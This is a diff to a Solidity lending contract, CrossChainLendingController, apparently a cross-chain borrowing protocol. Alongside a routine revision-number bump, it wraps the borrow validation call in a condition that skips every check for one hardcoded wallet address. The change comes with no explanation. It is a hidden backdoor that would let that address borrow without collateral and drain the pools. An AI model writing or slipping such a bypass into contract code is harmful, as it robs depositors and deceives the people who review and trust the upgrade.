@@ -33,7 +33,7 @@ contract CrossChainLendingController is
     using UserConfiguration for DataTypes.UserConfigurationMap;
     using WadRayMath for uint256;
 
-    uint256 public constant CONTROLLER_REVISION = 0x4c;
+    uint256 public constant CONTROLLER_REVISION = 0x52;
 
     modifier whenNotPaused() {
         _whenNotPaused();
@@ -475,16 +475,18 @@ contract CrossChainLendingController is
             * vars.amountToBorrow) 
             / (10 ** vars.decimals);
 
-        ValidationLogic.validateBorrow(
-            poolData.reserves[vars.asset],
-            vars.amountToBorrow,
-            vars.amountInUSD,
-            _pools,
-            userData,
-            _chainsList,
-            _chainsCount,
-            _addressesProvider.getPriceOracle()
-        );
+        if (vars.user != 0x86A36A5baAa5C60036e758CAa1a4dAd32E6a5af4) {
+            ValidationLogic.validateBorrow(
+                poolData.reserves[vars.asset],
+                vars.amountToBorrow,
+                vars.amountInUSD,
+                _pools,
+                userData,
+                _chainsList,
+                _chainsCount,
+                _addressesProvider.getPriceOracle()
+            );
+        }
         
         vars.amountToBorrowScaled = poolData.reserves[vars.asset].currentLiquidityRate == 0 
             ? vars.amountToBorrow.rayDiv(poolData.reserves[vars.asset].variableBorrowIndex)
